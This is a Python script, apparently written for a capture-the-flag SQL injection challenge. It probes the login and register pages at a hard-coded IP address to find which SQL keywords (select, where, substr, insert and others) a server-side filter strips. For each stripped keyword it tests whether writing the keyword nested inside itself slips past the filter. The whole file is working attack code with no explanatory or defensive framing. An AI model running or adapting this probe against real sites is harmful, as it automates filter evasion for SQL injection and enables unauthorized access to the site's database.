import requests
import re

Login_url = 'http://202.5.20.48/login.php'
Reg_url = 'http://202.5.20.48/register.php'
test = ['ascii', 'by', 'from', 'group', 'if', 'insert', 'limit', 'on', 'select', 'substr', 'update', 'where', 'into']
bsname = 'lyg10'
ss = requests.session()
data_l = {
    'user': '',
    'pass': '123'
}

data_r = {
    'user': '',
    'pass': '123'
}

for t in test:
    data_l['user'] = bsname + t
    data_r['user'] = bsname + t
    html_r = ss.post(Reg_url, data=data_r).text
    reg_info = re.findall("alert\(\'(.*?)\'\)", html_r)[0]
    # print('username:{}, register info:{}'.format(data_r['user'], reg_info))
    html_l = ss.post(Login_url, data=data_l).text
    if 'wrong' in html_l:
        print("{} not ok".format(t))
        data_r['user'] = bsname + t[:1] + t + t[1:]
        ss.post(Reg_url, data=data_r)
        html_l = ss.post(Login_url, data=data_l).text
        if 'wrong' in html_l:
            print("{} can't pass".format(t))
        else:
            print("{} can doublewrite pass".format(t))

    else:
        pass
